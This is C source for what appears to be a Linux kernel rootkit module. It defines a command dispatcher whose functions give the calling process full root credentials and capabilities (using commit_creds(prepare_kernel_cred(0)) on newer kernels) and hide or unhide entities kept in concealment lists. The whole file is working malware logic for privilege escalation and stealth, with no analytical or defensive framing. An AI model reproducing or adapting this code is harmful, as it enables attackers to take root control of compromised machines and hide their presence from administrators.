#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/string.h>
#include <asm/uaccess.h>

/* include */
#include "type.h"
#include "hidden_entity.h"

/* logic */
#include "cmd.h"
#include "hide.h"
#include "list_hidden.h"

static void _root_cred(const cmd_arg_t *p_cmd_arg)
{
        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
        current->uid   = 0;
        current->suid  = 0;
        current->euid  = 0;
        current->gid   = 0;
        current->egid  = 0;
        current->fsuid = 0;
        current->fsgid = 0;
        cap_set_full(current->cap_effective);
        cap_set_full(current->cap_inheritable);
        cap_set_full(current->cap_permitted);
        #else
        commit_creds(prepare_kernel_cred(0));
        #endif
}

static void _hide(const cmd_arg_t *p_cmd_arg)
{
        hide(p_cmd_arg->value, p_cmd_arg->list_hidden);
}

static void _show(const cmd_arg_t *p_cmd_arg)
{
        unhide(p_cmd_arg->value, p_cmd_arg->list_hidden);
}

// cmd function table
static void (*_cmd_ft[])(const cmd_arg_t *p_cmd_arg) = {
        (void *)_root_cred,
        (void *)_hide,
        (void *)_show,
};

void cmd_exec(const cmd_arg_t *p_cmd_arg)
{
        if (p_cmd_arg->cmd >= CMD_TOTAL)
                return;

        if (p_cmd_arg->list_hidden >= LIST_HIDDEN_TOTAL)
                return;

        // exec cmd: root creds, hide or show
        _cmd_ft[p_cmd_arg->cmd](p_cmd_arg);
}

